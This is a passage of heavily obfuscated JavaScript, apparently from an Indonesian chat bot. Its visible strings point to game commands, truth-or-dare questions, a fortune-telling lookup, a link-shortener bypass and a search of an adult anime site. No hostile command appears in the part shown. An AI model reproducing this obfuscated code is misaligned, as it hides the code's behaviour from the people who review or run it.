_0x3a8cda!==_0x3b0102;},'lKoas':_0x240d04(0xd14),'wRkHC':_0x240d04(0x1594),'DudRf':'Selamat\x20da'+'tang\x20di\x20fi'+_0x240d04(0x1abd)+'m!','gMcXY':_0x240d04(0x271f),'pGkRq':_0x240d04(0x1317)+'buat\x20backu'+'p\x20file,\x20tu'+'nggu\x20seben'+_0x240d04(0x69c),'XTRYN':_0x240d04(0x784),'XUDKl':'**/*','ennlW':_0x240d04(0x1962)+_0x240d04(0xa0f),'sAWSc':_0x240d04(0x2694)+'ip','QfRaD':_0x240d04(0x2854)+_0x240d04(0xfd2)+_0x240d04(0x3ce),'AhfMP':_0x240d04(0x98d),'XFSXJ':function(_0x56a7fb,_0x4413d0){return _0x56a7fb(_0x4413d0);},'ypbzP':function(_0x2d1aa1,_0x42d1ba){return _0x2d1aa1(_0x42d1ba);},'xDJYV':function(_0x201cc2,_0x278929){return _0x201cc2(_0x278929);},'UbCGQ':_0x240d04(0x14d3)+'alid.','fntZe':_0x240d04(0x21c6),'tAObd':_0x240d04(0x2d06),'AJkQh':function(_0x52423f,_0x230aa5){return _0x52423f(_0x230aa5);},'JLxqg':function(_0x2ac378,_0x5e9b86){return _0x2ac378(_0x5e9b86);},'zzCzG':function(_0x762982,_0x219b25){return _0x762982(_0x219b25);},'qyuZu':function(_0x583c0a,_0x54d9f1){return _0x583c0a(_0x54d9f1);},'uYWGs':_0x240d04(0x1c0c),'AmbTm':function(_0xef40a5,_0x45d28b){return _0xef40a5(_0x45d28b);},'HbAfe':_0x240d04(0x9a0)+_0x240d04(0x2b3f)+'.','GwIkc':'cekkontol','kjYYr':_0x240d04(0x1ec8),'MKHWg':_0x240d04(0x16b4),'TNidV':_0x240d04(0xe99),'QSSIv':'udah\x20perna'+_0x240d04(0x230c)+'n','fQkvT':_0x240d04(0x1eb0),'AcSJh':function(_0x402fb6,_0x558293){return _0x402fb6(_0x558293);},'NJOvT':_0x240d04(0x2a72),'eyaYo':_0x240d04(0x299e),'rCuWH':function(_0x29e13f,_0x559edc){return _0x29e13f(_0x559edc);},'StCgi':_0x240d04(0x168c)+'t','dCzhm':function(_0x3bdc2f,_0x4d18ac){return _0x3bdc2f(_0x4d18ac);},'HjXch':_0x240d04(0x25c),'IpomS':_0x240d04(0x2724)+_0x240d04(0x2345)+_0x240d04(0xdb)+_0x240d04(0x16a0),'VSAHV':function(_0x20c614,_0x2d33f0){return _0x20c614+_0x2d33f0;},'luYuy':'http://www'+'.primbon.c'+_0x240d04(0x1e03)+_0x240d04(0x1c5c)+_0x240d04(0x142c),'hCcBS':_0x240d04(0x12f5)+_0x240d04(0x2413)+'an\x20Kok','OXfJN':_0x240d04(0x12f5)+'\x20:\x2077%\x0a\x0aGa'+'k\x20akan\x20Sal'+_0x240d04(0x10ab)+_0x240d04(0xf7f)+'lu','CGTBj':_0x240d04(0x2eb0),'raoFt':'https://i.'+_0x240d04(0x110a)+'yt26/bf84f'+_0x240d04(0x1f53)+_0x240d04(0x1a50)+_0x240d04(0xd13)+'g','EHduY':_0x240d04(0x1670)+_0x240d04(0x1103)+_0x240d04(0x85b)+'a?\x0aCoba\x20ce'+_0x240d04(0xca6)+_0x240d04(0x7dd)+_0x240d04(0x161f),'wOBVS':_0x240d04(0x147)+'n\x20yang\x20kam'+'u\x20sukai?','RfSRa':_0x240d04(0x2238)+'terburukmu'+'?','pCISH':_0x240d04(0x1822)+'a\x20sama\x20sia'+_0x240d04(0x23ae)+'rapa\x20lama?','uhgNI':_0x240d04(0x1f09)+_0x240d04(0x144c)+_0x240d04(0x84f),'AqXDa':_0x240d04(0x27f3)+_0x240d04(0x2e60)+'car\x20teman\x20'+_0x240d04(0x4cd)+_0x240d04(0x29e0)+_0x240d04(0x1035)+_0x240d04(0x24f4),'BVXvQ':_0x240d04(0xa4b)+_0x240d04(0x19e3)+'g\x20nyokap\x20a'+_0x240d04(0x1bfb)+_0x240d04(0x5a3),'mfLVX':'Pernah\x20cin'+'ta\x20bertepu'+_0x240d04(0xb34)+'tangan?\x20ka'+'lo\x20pernah\x20'+'sama\x20siapa'+'?\x20rasanya\x20'+_0x240d04(0x21cc)+'u?','EGiPy':_0x240d04(0x94d)+_0x240d04(0x9df)+_0x240d04(0x2c6e),'RHsOa':_0x240d04(0xe64)+_0x240d04(0x2986)+_0x240d04(0x958)+_0x240d04(0x2af5)+_0x240d04(0x1167)+_0x240d04(0x1732),'uLPlp':_0x240d04(0x915)+_0x240d04(0x2ac9)+_0x240d04(0xe6e)+_0x240d04(0x24bb)+_0x240d04(0x20ae)+'ni','SLtyE':'Sapa\x20orang'+_0x240d04(0x2e91)+_0x240d04(0xb0c)+_0x240d04(0x2aea),'wVPvG':_0x240d04(0x2329)+_0x240d04(0x3f5)+_0x240d04(0x253d)+_0x240d04(0x2c01)+'?','IUADn':'Suka\x20mabar'+_0x240d04(0x80b)+_0x240d04(0xfb9)+_0x240d04(0x2c91),'qdENR':_0x240d04(0x2daa)+_0x240d04(0x2614)+'alasannya\x20'+_0x240d04(0x258),'qcwRJ':_0x240d04(0x22ea)+'ejadian\x20ya'+_0x240d04(0xc60)+_0x240d04(0x199e)+_0x240d04(0x2ae8)+'masih\x20di\x20i'+'nget','GyPqA':_0x240d04(0x1601)+_0x240d04(0x197f)+_0x240d04(0x1819)+_0x240d04(0x248d)+_0x240d04(0x1f80),'MTCSk':_0x240d04(0x1aac)+_0x240d04(0x10df)+_0x240d04(0x124c)+_0x240d04(0x50c)+'?','mcfEv':_0x240d04(0x27f3)+_0x240d04(0x1d77)+_0x240d04(0x12e5)+_0x240d04(0x1b87)+_0x240d04(0x1fd5),'wSRik':function(_0x409562,_0x4b2e38){return _0x409562(_0x4b2e38);},'PjtKD':_0x240d04(0x13dd)+_0x240d04(0x1631)+_0x240d04(0xf8f)+_0x240d04(0x1501)+_0x240d04(0x150b)+'ah','pSsZy':_0x240d04(0x2ac7)+_0x240d04(0x269d)+'!','EzWey':function(_0xe2c1ff,_0x1ca59e){return _0xe2c1ff!==_0x1ca59e;},'LePLz':function(_0x468a87,_0x53e343,_0x800ea4){return _0x468a87(_0x53e343,_0x800ea4);},'FgNhq':_0x240d04(0x8df)+_0x240d04(0xb9b)+_0x240d04(0xcf3),'koGmo':_0x240d04(0x2455),'WFGNO':_0x240d04(0x2724)+_0x240d04(0x2345)+'rm-urlenco'+_0x240d04(0x2630)+'et=UTF-8','fsHMD':function(_0x3d41a2,_0x2c8865){return _0x3d41a2(_0x2c8865);},'IPGNI':_0x240d04(0x16a8),'VgpLA':_0x240d04(0x8d0),'nmPUj':function(_0xb2fd4a,_0x14a7f5){return _0xb2fd4a/_0x14a7f5;},'dmUWa':function(_0x5f2e79,_0x25fa72){return _0x5f2e79/_0x25fa72;},'xlUgg':function(_0x5770c8,_0x4e8a73){return _0x5770c8%_0x4e8a73;},'YcKzo':_0x240d04(0x20fd),'oaVdL':'nekopoi','PwLKR':'TvqMr','zSriT':_0x240d04(0x1eba)+'ekosearch\x20'+'Isekai','zNBZL':_0x240d04(0xcf0)+_0x240d04(0xce2),'JltIN':function(_0x572652,_0x2c53ba){return _0x572652(_0x2c53ba);},'igzLW':function(_0x369563,_0x27e417){return _0x369563+_0x27e417;},'hHZUm':_0x240d04(0x2126),'NHLfm':function(_0x435606,_0x4f93be){return _0x435606(_0x4f93be);},'Alksi':'_Mengambil'+_0x240d04(0x6af)+'_','fWJFJ':_0x240d04(0x160d),'xGPWI':_0x240d04(0x1f82)+'l','qoyNl':function(_0x13691d,_0x4d50fe){return _0x13691d===_0x4d50fe;},'RvPEW':'http','RYJZl':function(_0x295e6a,_0x55df97){return _0x295e6a(_0x55df97);},'ovbfM':_0x240d04(0x21bc)+_0x240d04(0x13e1)+':\x20','ucMlB':_0x240d04(0x2457),'LhxsR':_0x240d04(0x1caa),'DQHjY':function(_0x11ee94,_0x37dd59){return _0x11ee94(_0x37dd59);},'tyHnx':_0x240d04(0x1ac0)+'\x20link\x20OUO,'+'\x20tunggu\x20se'+_0x240d04(0x1bb5),'EPXPQ':function(_0xf26aab,_0x650a15){return _0xf26aab===_0x650a15;},'jKhAA':'UuHVp','NQNWq':'JITLR','NWaUO':function(_0x3e89d9,_0x5a3e2b){return _0x3e89d9(_0x5a3e2b);},'qVBCY':function(_0x48659d,_0x1d6695){return _0x48659d(_0x1d6695);},'hOwpS':function(_0x302328,_0x5bc0a4){return _0x302328!==_0x5bc0a4;},'ViPqO':'gqVAg','JVNAc':_0x240d04(0xf85),'RpzHm':function(_0x28319b,_0x24e4f6){return _0x28319b+_0x24e4f6;},'hbSIH':_0x240d04(0xc75),'pbSBb':_0x240d04(0x158a),'lHIeZ':_0x240d04(0x1e1a),'fpGYa':function(_0x28dc7e,_0x1a1266){return _0x28dc7e*_0x1a1266;},'wxHGj':_0x240d04(0x161),'CAtXk':_0x240d04(0x429),'WNyqh':'bocil\x20epep','TvMai':'emak\x20emak','mwIDu':_0x240d04(0x1e53),'Flwby':_0x240d04(0x639),'YrRCy':'cabai','KSgHH':'daging','uaLMW':_0x240d04(0x2339)+'la','Mttiu':_0x240d04(0x166a),'tKSps':_0x240d04(0xb20),'Ovilw':'wortel','rNnHZ':_0x240d04(0x1c79),'cNlrb':'teh','AvdNC':_0x240d04(0x1b81),'bznLX':_0x240d04(0x1ca1),'ULpuw':_0x240d04(0x2de7),'VcCnQ':_0x240d04(0x131a),'ZUFLX':_0x240d04(0x1564)+'Rumah','DTDyF':_0x240d04(0x1bc2)+'i\x20Gedung','WEPds':function(_0x24789c){return _0x24789c();},'qChQt':function(_0x4114a1,_0x56179f){return _0x4114a1===_0x56179f;},'uhDKY':_0x240d04(0x2067),'XhrsH':function(_0x45ad30,_0x3d1a8a){return _0x45ad30(_0x3d1a8a);},'rbjmm':function(_0xadfff4,_0x2820f4){return _0xadfff4(_0x2820f4);},'TrriZ':_0x240d04(0x3af),'RRxrD':_0x240d04(0xd71),'URFJP':function(_0x16c46d,_0x23d01a){return _0x16c46d(_0x23d01a);},'bsEjV':_0x240d04(0xd24),'pBUJI':function(_0x28d58a,_0xd3f94){return _0x28d58a*_0xd3f94;},'cefhx':_0x240d04(0xdb2),'OOLIX':_0x240d04(0x1759),'Mennb':_0x240d04(0x24e7),'XOVIz':function(_0x143b15,_0xf69981){return _0x143b15*_0xf69981;},'ggUYC':function(_0x4bdfda,_0x25941c){return _0x4bdfda(_0x25941c);},'GSpou':_0x240d04(0x14ac),'tNGQM':function(_0x314906,_0x5210bf){return _0x314906(_0x5210bf);},'uZKDs':'saldo','Tqski':function(_0x43105e,_0xb35e80){return _0x43105e!==_0xb35e80;},'syzBs':_0x240d04(0x1783),'GQNmI':_0x240d04(0x16f8),'wyLBb':_0x240d04(0x15ab),'GCjNg':function(_0x4e8001){return _0x4e8001();},'BvGWp':function(_0x92ed91,_0x1471a2){return _0x92ed91===_0x1471a2;},'wrUZA':_0x240d04(0x160e),'uoWje':_0x240d04(0x277d),'mtpll':'znfMG','MgzcR':function(_0x10aee1,_0x1df416){return _0x10aee1!==_0x1df416;},'fBUAg':'avghv','RiOxT':function(_0x485a0c){return _0x485a0c();},'wvvgL':_0x240d04(0x926),'swwRX':_0x240d04(0x802),'zRoUF':function(_0x519e93,_0x4f7543){return _0x519e93(_0x4f7543);},'EdOex':function(_0x24d0b2,_0x433333){return _0x24d0b2*_0x433333;},'RTJuk':function(_0x4b5fe9,_0x4c751b){return _0x4b5fe9*_0x4c751b;},'rbDTv':function(_0x7736b3,_0x393701){return _0x7736b3+_0x393701;},'uARQi':function(_0x35a0fc,_0x689dd1){return _0x35a0fc(_0x689dd1);},'rcrUo':_0x240d04(0x2d2e)+_0x240d04(0xae4)+_0x240d04(0x2a36)+_0x240d04(0x1fc9)+'k\x20mencoba\x20'+_0x240d04(0x215e),'AJdlC':function(_0x2a5fed,_0xb45766){return _0x2a5fed(_0xb45766);},'ZYiPo':function(_0x564f2b,_0x63b299){return _0x564f2b(_0x63b299);},'AHqRZ':'oLcAy','TjeRY':'djRzm','rqaaO':function(_0x4dbad5,_0xefd3fb){return _0x4dbad5(_0xefd3fb);},'UYgQP':function(_0x7fd62a){return _0x7fd62a();},'MVKad':_0x240d04(0x1998),'MomHX':function(_0xe2b8e4,_0x22ef23){return _0xe2b8e4>_0x22ef23;},'GNRgv':function(_0x4ce9ce,_0x1a410f){return _0x4ce9ce(_0x1a410f);},'wjOXE':function(_0x59f810,_0x50799c){return _0x59f810(_0x50799c);},'FJZsC':function(_0x5638db,_0x35cd6b){return _0x5638db*_0x35cd6b;},'mMWkf':function(_0x14ecdb,_0x31b869){return _0x14ecdb||_0x31b869;},'VDkKE':_0x240d04(0x2a87),'cUWWx':_0x240d04(0x2e23)+'pelanggan.'+_0x240d04(0x1cc4),'Emvyv':'➕\x20💹\x20Meneri'+_0x240d04(0x28a7)+'.','CHPHM':function(_0x5704a4,_0x45599f){return _0x5704a4(_0x45599f);},'aAyac':_0x240d04(0xd03),'GuQGl':function(_0x1cede7,_0x183c43,_0x2271a9){return _0x1cede7(_0x183c43,_0x2271a9);},'QLJdd':'mulung','HyEsx':function(_0x3487df,_0x55b92f){return _0x3487df!==_0x55b92f;},'BmLRD':_0x240d04(0x27a1),'VKeup':'rbAfT','lYhfS':function(_0x151078,_0x433fc2){return _0x151078===_0x433fc2;},'CjQCA':function(_0x58faf4){return _0x58faf4();},'PAgUL':function(_0x153fdb,_0x3d3458){return _0x153fdb*_0x3d3458;},'BzkXz':function(_0x385a71,_0x3e4e95){return _0x385a71+_0x3e4e95;},'fLkXS':function(_0x5e031b,_0x3bd8bc){return _0x5e031b>_0x3bd8bc;},'wHfWa':function(_0x56f95f,_0x1e3efd){return _0x56f95f(_0x1e3efd);},'nIAaY':function(_0x50a8e9,_0x1d191c){return _0x50a8e9*_0x1d191c;},'mknlG':function(_0x1ab376,_0x2f6019){return _0x1ab376*_0x2f6019;},'jKcka':_0x240d04(0x52a),'FQwgW':_0x240d04(0x2c60),'VMCSU':_0x240d04(0x1979),'kUMCe':_0x240d04(0x1298),'vrBMj':function(_0x2f6df4,_0x55de3b){return _0x2f6df4(_0x55de3b);},'EiLMF':function(_0x146453,_0x552eb8){return _0x146453(_0x552eb8);},'MKFiV':function(_0x4d4fa3,_0x58a55c){return _0x4d4fa3(_0x58a55c);},'Atzaz':function(_0x457975,_0x34553a){return _0x457975 in _0x34553a;},'jgzZw':'lHmBL','HysWq':function(_0x2000bf,_0x5d72e0){return _0x2000bf+_0x5d72e0;},'tlrvq':function(_0x43f96,_0x5b285b){return _0x43f96(_0x5b285b);},'bkpOu':function(_0x579f74,_0x85e429){return _0x579f74(_0x85e429);},'yJdBK':function(_0x3411a1,_0x10f9b4){return _0x3411a1(_0x10f9b4);},'vfImU':function(_0x1b71fe,_0x587ad7){return _0x1b71fe(_0x587ad7);},'RAGhO':_0x240d04(0x2928),'VAagy':_0x240d04(0x118b),'SxPwz':function(_0x4b8b56,_0x141fe5){return _0x4b8b56===_0x141fe5;},'cYcJC':_0x240d04(0x278c),'fmMoK':_0x240d04(0x1632),'NWcYh':'HeJXY','VHCCo':'gwWws','IvThN':function(_0x37f110,_0x53335a){return _0x37f110(_0x53335a);},'WOAmu':function(_0x58c71d,_0xd47ccb){return _0x58c71d(_0xd47ccb);},'ocyad':function(_0x5179c8,_0x5bf116){return _0x5179c8 in _0x5bf116;},'fJNWb':function(_0x1f8ea5,_0x501554){return _0x1f8ea5+_0x501554;},'pGviW':function(_0x239dbf,_0x2a2e04){return _0x239dbf+_0x2a2e04;},'RtHOm':function(_0x423da1,_0x5708b6){return _0x423da1(_0x5708b6);},'qFJsA':function(_0x414a8c,_0x3633a6){return _0x414a8c(_0x3633a6);},'Vmayn':_0x240d04(0x54a)+_0x240d04(0x1e1b)+'at\x20menjual'+'\x20item.','gyPlJ':_0x240d04(0x125),'oKZpa':function(_0x718da8,_0x3dfdc0){return _0x718da8-_0x3dfdc0;},'NZzls':function(_0x464ea1,_0x33d67d){return _0x464ea1<_0x33d67d;},'HNQHA':function(_0x982ca8,_0x2ef82f){return _0x982ca8(_0x2ef82f);},'HVzld':function(_0x119087,_0x47e2a2){return _0x119087!==_0x47e2a2;},'aBIqJ':'RWxdp','qEaYT':function(_0x541343,_0x711bc0){return _0x541343(_0x711bc0);},'XVCkW':'*⛏️\x20Kamu\x20me'+_0x240d04(0x261d)+_0x240d04(0x26db)+'an:*','EVmec':'NYSgB','Lbytr':'\x0a\x0a*🎉\x20Dan\x20k'+_0x240d04(0x1cf9)+'atkan:*','IbiCO':function(_0x5f4efc,_0x25d69d){return _0x5f4efc(_0x25d69d);},'MzCcw':function(_0x2a5a73,_0x3f6bff){return _0x2a5a73(_0x3f6bff);},'lcHDC':_0x240d04(0x1185),'iXqwH':function(_0x27a9f8,_0x42f564){return _0x27a9f8===_0x42f564;},'konmn':_0x240d04(0x213f),'FGHfi':'KdlTe','LKlIm':_0x240d04(0x2196),'iDYTT':_0x240d04(0x2ac4),'cMQwX':function(_0x456e49){return _0x456e49();},'PZPxz':_0x240d04(0xa65),'XMNhk':function(_0x54947b,_0x4434fa){return _0x54947b(_0x4434fa);},'AsKoS':function(_0x3826bd,_0x2c7f48){return _0x3826bd(_0x2c7f48);},'VTrJM':function(_0x3cc2cf,_0x23c4c8){return _0x3cc2cf!==_0x23c4c8;},'kYdbI':'UDVCC','jbGqV':function(_0x133d11,_0x3c4ef1){return _0x133d11(_0x3c4ef1);},'kPNaz':function(_0x565bc8,_0xb278c0){return _0x565bc8(_0xb278c0);},'UVCFt':_0x240d04(0x2916)+_0x240d04(0x1d65)+_0x240d04(0x2625),'eIxbn':function(_0xa8923d,_0x1576b1){return _0xa8923d-_0x1576b1;},'BvtYo':_0x240d04(0x42f),'AWfFG':function(_0x58cde9,_0x570e24){return _0x58cde9(_0x570e24);},'oIEWM':function(_0x521e00,_0x413c0a){return _0x521e00-_0x413c0a;},'WFEeb':function(_0x46ba44,_0x10002f){return _0x46ba44*_0x10002f;},'UbXcm':function(_0x33892a,_0x5229ab){return _0x33892a===_0x5229ab;},'iNIFa':_0x240d04(0xfa8),'Etnnc':function(_0x3b4927,_0x3d8519){return _0x3b4927(_0x3d8519);},'bNqiG':function(_0x16ad7c,_0x4f1c27){return _0x16ad7c(_0x4f1c27);},'QhGwZ':function(_0xde7028,_0x261f99){return _0xde7028!==_0x261f99;},'kLeua':function(_0x4dce6b,_0x1c71cf){return _0x4dce6b(_0x1c71cf);},'fqNqZ':_0x240d04(0x1269),'MUggp':_0x240d04(0x2b1f),'StPhF':function(_0x4e2c7b){return _0x4e2c7b();},'lKQGB':function(_0x399792,_0x386659){return _0x399792!==_0x386659;},'qeRSC':_0x240d04(0x14d),'NvdUV':_0x240d04(0x5ec),'CBtrQ':function(_0x59c70a,_0x493cee){return _0x59c70a(_0x493cee);},'eENIW':function(_0x5a1e3a,_0x530b2b){return _0x5a1e3a+_0x530b2b;},'KKdcw':'sjZAB','KBuzb':function(_0x39bfc7,_0x3fd6ea){return _0x39bfc7>_0x3fd6ea;},'fdnVE':function(_0x5a4f80,_0x345de1){return _0x5a4f80(_0x345de1);},'cmaFp':function(_0x4ad6ef,_0x3d74c7){return _0x4ad6ef*_0x3d74c7;},'qxZWU':function(_0x435e0c,_0x1254f3){return _0x435e0c*_0x1254f3;},'jmfpl':function(_0x1db9ce,_0x52af23){return _0x1db9ce*_0x52af23;},'JmJPx':_0x240d04(0x546),'vJtdw':function(_0x10973c,_0x3f6234){return _0x10973c+_0x3f6234;},'kVfrM':function(_0x187233,_0x211a99){return _0x187233+_0x211a99;},'kcmLW':_0x240d04(0x25dd),'VPEWq':function(_0x59958e,_0x477526){return _0x59958e(_0x477526);},'ttJeK':function(_0x10cf41,_0xd9af51,_0x38fcfe){return _0x10cf41(_0xd9af51,_0x38fcfe);},'DaoTz':_0x240d04(0x1b6b),'bUTWV':function(_0x44b20d,_0x1bad9f){return _0x44b20d(_0x1bad9f);},'OJaZr':function(_0xb3a186,_0x8d76eb){return _0xb3a186(_0x8d76eb);},'wsjRj':function(_0x2273f0,_0x323df7){return _0x2273f0*_0x323df7;},'yvnhC':function(_0x1ef1a1,_0x4f0b92){return _0x1ef1a1!==_0x4f0b92;},'vPYlk':_0x240d04(0x14f4),'AZvAF':function(_0x24b537,_0x5e1c75){return _0x24b537(_0x5e1c75);},'cfYom':function(_0x3b0404,_0x5a35c7){return _0x3b0404>_0x5a35c7;},'rqVeE':_0x240d04(0x2c1e),'nOZdC':_0x240d04(0x16df),'gMoiG':function(_0x36e22f,_0x58ff38){return _0x36e22f(_0x58ff38);},'oXAfP':_0x240d04(0x2176),'jjtpv':function(_0x1180e0,_0x54946f){return _0x1180e0*_0x54946f;},'yyHrX':function(_0x8017df,_0x71d74c){return _0x8017df*_0x71d74c;},'hMdkF':function(_0x460281,_0x4f0d93){return _0x460281||_0x4f0d93;},'DIWcY':function(_0x232584,_0xf838f2){return _0x232584(_0xf838f2);},'szPAC':function(_0x1e5e7e,_0x532529,_0x2aa935){return _0x1e5e7e(_0x532529,_0x2aa935);},'IHuLF':function(_0x207d2d,_0x32726a,_0x51c76b){return _0x207d2d(_0x32726a,_0x51c76b);},'LFkAA':function(_0x5e178c,_0x3d1c34){return _0x5e178c===_0x3d1c34;},'oRluA':_0x240d04(0x166d),'ampQA':function(_0x3071cf,_0xa0456b){return _0x3071cf(_0xa0456b);},'yqkIf':_0x240d04(0x54a)+'salahan\x20sa'+_0x240d04(0x1d8e)+_0x240d04(0xa9a)+_0x240d04(0x2e36),'PfhoH':function(_0x4da08a,_0x327c8b){return _0x4da08a(_0x327c8b);},'CvBte':function(_0x5c8d6b,_0x4d87fa){return _0x5c8d6b===_0x4d87fa;},'dFHmB':_0x240d04(0x1ce3),'JSQrp':'MndJO','eVtqu':function(_0x475e6b,_0x39e0b8){return _0x475e6b*_0x39e0b8;},'wzZlY':function(_0x1976fa,_0x575785){return _0x1976fa<_0x575785;},'uhaCA':_0x240d04(0x1c52)+'a','toYpN':function(_0x12005d,_0x52dcfe){return _0x12005d<_0x52dcfe;},'jDDaT':_0x240d04(0x9dd),'cPTQz':'bibitapel','MpqRn':function(_0x580411,_0x43b8c){return _0x580411>_0x43b8c;},'Cshkd':'dswMn','xCmyp':function(_0x10b040,_0x24fee4){return _0x10b040(_0x24fee4);},'wMGpg':function(_0x24c56d,_0x2e0e3a){return _0x24c56d(_0x2e0e3a);},'tzpEM':function(_0x4ea551,_0x5429da){return _0x4ea551*_0x5429da;},'IpXPD':function(_0x31f904,_0x4a2219){return _0x31f904*_0x4a2219;},'MdjLM':function(_0x658ad4,_0x58691e){return _0x658ad4*_0x58691e;},'YqnBm':function(_0x15c0a9,_0x33924a){return _0x15c0a9*_0x33924a;},'fPAel':function(_0x334c74,_0x863765,_0x25dedc){return _0x334c74(_0x863765,_0x25dedc);},'wtSqO':function(_0xfe7bc4,_0x25db08,_0x30aff7){return _0xfe7bc4(_0x25db08,_0x30aff7);},'Eyatr':function(_0x3082e5,_0x135c8c){return _0x3082e5!==_0x135c8c;},'FRHPv':_0x240d04(0x214),'oTtNS':'EFeeY','sPCZv':function(_0x58a039,_0x31c598){return _0x58a039(_0x31c598);},'nOHGN':'crafting','RkYNY':function(_0x5a4d33,_0x3e6617){return _0x5a4d33(_0x3e6617);},'PqDdb':function(_0x4f4383,_0x45a014){return _0x4f4383(_0x45a014);},'jgFqj':function(_0x43f19c,_0x4de34f){return _0x43f19c(_0x4de34f);},'JOOqQ':function(_0x473741,_0x22f079){return _0x473741===_0x22f079;},'joPLQ':function(_0x438a83,_0x51417d){return _0x438a83(_0x51417d);},'uhbTZ':function(_0x42740a){return _0x42740a();},'Njafn':function(_0x1da848,_0x3cd144){return _0x1da848(_0x3cd144);},'Qmalc':_0x240d04(0x43f),'XkEYl':_0x240d04(0x2703),'SVhiP':function(_0x1eaab2,_0x3884a1){return _0x1eaab2(_0x3884a1);},'dTyAU':function(_0x19d883,_0x3da738){return _0x19d883(_0x3da738);},'ZPbUA':function(_0x4d43db,_0x3fbd6e){return _0x4d43db*_0x3fbd6e;},'urMHK':function(_0x2d5825,_0x26de1f){return _0x2d5825>_0x26de1f;},'kwpPS':function(_0x2a1adf,_0x4256a3){return _0x2a1adf!==_0x4256a3;},'oStvv':_0x240d04(0x1dab),'CnstT':function(_0x555cd1,_0x51495b){return _0x555cd1(_0x51495b);},'Rdefo':function(_0x20aae4,_0x1a8bf6){return _0x20aae4!==_0x1a8bf6;},'YQeAY':'yNhqZ','OKzoR':_0x240d04(0x2087),'lHbWy':function(_0x176c41,_0xa09741){return _0x176c41(_0xa09741);},'ZFVqe':function(_0x1af759,_0x5ab1d1){return _0x1af759(_0x5ab1d1);},'OSQln':function(_0x4765b0,_0x2fb868){return _0x4765b0(_0x2fb868);},'JkjJJ':_0x240d04(0x10ce),'sokNT':'bonus','eavMr':function(_0x2b7999,_0x1501b7){return _0x2b7999(_0x1501b7);},'IzlcI':function(_0x55d877,_0x59064d){return _0x55d877(_0x59064d);},'jeFjN':function(_0x258126,_0x4b2d0e){return _0x258126(_0x4b2d0e);},'yWMAn':_0x240d04(0x132e),'NiAiw':function(_0x24d1e9,_0x25965e){return _0x24d1e9===_0x25965e;},'wBhGK':'xNLdu','yADEC':_0x240d04(0x1a7c),'ZlHGx':'mangga','fYrIY':'jeruk','fexHL':_0x240d04(0x1f22),'BqaSt':function(_0x4ed6da,_0x41f9a2){return _0x4ed6da*_0x41f9a2;},'goczz':function(_0x9bd29a,_0x33ca9a){return _0x9bd29a===_0x33ca9a;},'YwSmx':function(_0x17f197,_0x31934b){return _0x17f197!==_0x31934b;},'cuNTV':_0x240d04(0x208a),'ymRXA':_0x240d04(0x185d),'VEDjY':function(_0x4f1b31,_0x26be31){return _0x4f1b31(_0x26be31);},'KXGPs':_0x240d04(0x1e4c)+_0x240d04(0x2dc9)+_0x240d04(0x2161)+_0x240d04(0x1350),'STjuJ':function(_0x46fb2a,_0x178a66){return _0x46fb2a+_0x178a66;},'cbLva':function(_0x483841,_0x2a81a8){return _0x483841+_0x2a81a8;},'QNVns':function(_0x21092c,_0x210f95){return _0x21092c+_0x210f95;},'dDOtx':function(_0x293231,_0x27e1c7){return _0x293231(_0x27e1c7);},'effem':_0x240d04(0x20e9),'PHcUT':_0x240d04(0x155e),'qewIA':function(_0x3aebca,_0x5810bc){return _0x3aebca(_0x5810bc);},'lhFcR':_0x240d04(0x2432),'vNRWa':_0x240d04(0x26c7),'YBtuf':'dGHRl','sgMbb':function(_0x27a978,_0x552f00){return _0x27a978(_0x552f00);},'HiKjB':function(_0x4a79dc,_0x415f2f){return _0x4a79dc-_0x415f2f;},'fJyZZ':function(_0x18e517,_0xf22068){return _0x18e517>_0xf22068;},'JinaF':function(_0x28597d,_0x3c7510){return _0x28597d(_0x3c7510);},'ACTLK':function(_0x376f08,_0x280f3a){return _0x376f08(_0x280f3a);},'DEbsr':function(_0x35372e,_0x7d42a0){return _0x35372e*_0x7d42a0;},'ZKysH':function(_0x1dfcd5,_0x485184){return _0x1dfcd5(_0x485184);},'sISYD':_0x240d04(0x16d2),'zPbnQ':function(_0x18e833,_0x508eb9,_0xe8f6c7){return _0x18e833(_0x508eb9,_0xe8f6c7);},'StmMI':function(_0x5e30da,_0x7225b7,_0x1ee6c2){return _0x5e30da(_0x7225b7,_0x1ee6c2);},'tHMtC':_0x240d04(0x21ce),'LKgCi':function(_0x204ae5){return _0x204ae5();},'OnqRZ':_0x240d04(0xd64)+_0x240d04(0x14b9)+_0x240d04(0xd09),'NgRoU':function(_0x15358c,_0x5782f4){return _0x15358c<_0x5782f4;},'RBRNH':_0x240d04(0x1dfe),'ttEAN':function(_0x42b0c4,_0x3635e7){return _0x42b0c4(_0x3635e7);},'MlzfV':function(_0x28dc16,_0x11e725){return _0x28dc16(_0x11e725);},'RoBlv':function(_0xda9ba4,_0x44dfe0){return _0xda9ba4(_0x44dfe0);},'xsMsO':_0x240d04(0x54a)+_0x240d04(0x1e1b)+_0x240d04(0x24aa)+'skan.','PfVVF':_0x240d04(0x66e),'VsUZD':function(_0x148947){return _0x148947();},'QgYYz':function(_0x300d02,_0x67fc31){return _0x300d02(_0x67fc31);},'VxUAW':'⛓️\x20Kamu\x20sed'+_0x240d04(0x9ad)+_0x240d04(0x24c5)+_0x240d04(0xd01)+'\x20untuk\x20kel'+_0x240d04(0x1fc4),'NojDB':function(_0x3151e8,_0x10af50){return _0x3151e8<=_0x10af50;},'YnThp':function(_0x4fbe6e,_0x580d3c){return _0x4fbe6e(_0x580d3c);},'DQXzU':'❌\x20Kamu\x20tid'+_0x240d04(0x1bd5)+_0x240d04(0x871)+_0x240d04(0x1deb)+_0x240d04(0x26f3),'Aonww':function(_0x45aae0,_0x2f67b2){return _0x45aae0<=_0x2f67b2;},'avqRg':function(_0x462468,_0x2ba3f9){return _0x462468(_0x2ba3f9);},'oEAYC':function(_0x5cae94,_0x1f9628){return _0x5cae94-_0x1f9628;},'toffz':function(_0x9bcca2,_0x2848b7){return _0x9bcca2(_0x2848b7);},'NgQQH':function(_0x14eda2,_0x27c80d){return _0x14eda2*_0x27c80d;},'zkOsu':function(_0x4fea9d,_0x3dceb2){return _0x4fea9d*_0x3dceb2;},'FvPkE':function(_0x1f51a0,_0x3b1c7a){return _0x1f51a0*_0x3b1c7a;},'gEIBe':function(_0x108182,_0x2f829a){return _0x108182*_0x2f829a;},'zirya':function(_0x4a8387,_0x316a77){return _0x4a8387*_0x316a77;},'JnRNm':function(_0x36c7c6,_0x4f9d54){return _0x36c7c6*_0x4f9d54;},'unnAh':function(_0x46a701,_0x53c030){return 